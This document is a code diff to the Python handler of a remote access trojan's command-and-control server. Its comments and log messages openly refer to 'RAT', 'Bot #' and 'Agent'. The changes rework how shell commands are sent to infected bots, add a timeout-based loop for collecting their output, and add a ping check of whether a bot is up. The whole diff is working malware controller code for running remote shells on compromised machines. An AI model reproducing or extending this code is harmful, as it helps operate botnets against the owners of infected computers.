@@ -7,6 +7,7 @@ import signal
 import threading
 import queue
 import time
+import subprocess
 
 class Handler(threading.Thread):
 
@@ -144,7 +145,7 @@ class Handler(threading.Thread):
                 try:
                     cmd_response = ""
                     shell_exit = False
-                    if(cmd_sent.casefold() == 'quit\n' or cmd_sent.casefold() == 'exit\n'):
+                    if(cmd_sent.casefold().strip(" ") == 'quit\n' or cmd_sent.casefold().strip(" ") == 'exit\n'):
                         print(f"[* BotHandler-Msg:ShellExec] Sending EXIT signal to Agent. Please wait...")
                         self.client.send(("exit\n").encode('utf-8'))
 
@@ -169,7 +170,6 @@ class Handler(threading.Thread):
                             else:
                                 cmd_response += recv  
                         
-                        print("yo1")
                         shell_exit = True
 
                     else:
@@ -210,35 +210,56 @@ class Handler(threading.Thread):
                         print(cmd_response.replace(cmd_sent,""))
             
                     if(shell_exit):
-                        print("yo")
                         break
 
         print(f"[* BotHandler-Msg:ShellExec] Exiting interaction with Bot #{self.bot_id} at {str(self.ip)}")
         return True
 
 
-    def execute(self, command):
+    def execute(self, cmd_sent):
 
-        print(f"[* BotHandler-Msg] Received Command: {str(command)} for bot {str(self.bot_id)}")
+        print(f"[* BotHandler-Msg] Received Command: {str(cmd_sent)} for bot {str(self.bot_id)}")
 
         # Single instance execution
         try:
-            #command += "\n"
-
             # Send data/command to RAT
-            self.client.send(command.encode('utf-8'))
-            #print(recvVal)                                          # Display message received
+            self.client.send(cmd_sent.encode('utf-8'))
         except Exception as ex:
-            # for t in allConnections:
-            #     if t.is_alive() == False:
-            #         print("\n[!] Died Thread: " + str(t))
-            #         t.join()
-            print(f"[* BotHandler-Msg] Unable to send connection to bot {self.bot_id} at {str(self.ip)}")
+            print(f"[* BotHandler-Msg] Unable to send command to bot {self.bot_id} at {str(self.ip)}")
             print(f"[* BotHandler-Msg] Error: {ex}")
             return "== Return Value Error =="
         else:
-            recvVal = (self.client.recv(2048)).decode('utf-8')      # Receive reply from RAT
-            return recvVal
+            cmd_response = ""
+            while(True):
+                try:
+                    if (cmd_sent.casefold() == "\n"):
+                        self.client.settimeout(0.5)
+                    elif (len(cmd_response) <= len(cmd_sent)):
+                        self.client.settimeout(5)
+                    else:
+                        self.client.settimeout(1)
+                        
+                    recv = self.client.recv(4096).decode('utf-8')
+
+                except socket.timeout:
+                    # if timeout exception is triggered - assume no data anymore
+                    recv = ""
+                except Exception as ex:
+                    print("[* BotHandler-Msg:ShellExec] Unable to process received data.")
+                    print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
+                    break
+
+                if not recv:
+                    break
+                else:
+                    cmd_response += recv
+                    
+                    
+            if len(cmd_response.strip()) > 1:
+                # Removing sent command from response before printing output
+                return cmd_response.replace(cmd_sent,"")
+            else:
+                return "\n"
 
             # TODO %%
             # print(f"[* BotHandler-Msg] Using beacon verification to test if host is still up...")
@@ -252,6 +273,23 @@ class Handler(threading.Thread):
         print("ping")
         # beacon rat
         #   if no reply, set host status to LOST
+
+        # for t in allConnections:
+        #     if t.is_alive() == False:
+        #         print("\n[!] Died Thread: " + str(t))
+        #         t.join()
+
+    def ping(self):
+
+        response = subprocess.Popen(["ping", "-c", "4", self.ip],
+        stdout = subprocess.PIPE,
+        stderr = subprocess.STDOUT)
+        stdout, stderr = response.communicate()
+
+        if (response.returncode == 0):
+            return "UP"
+        else:
+            return "DOWN"
 
     # TODO %%
     def download(self, remotepath, localfile):
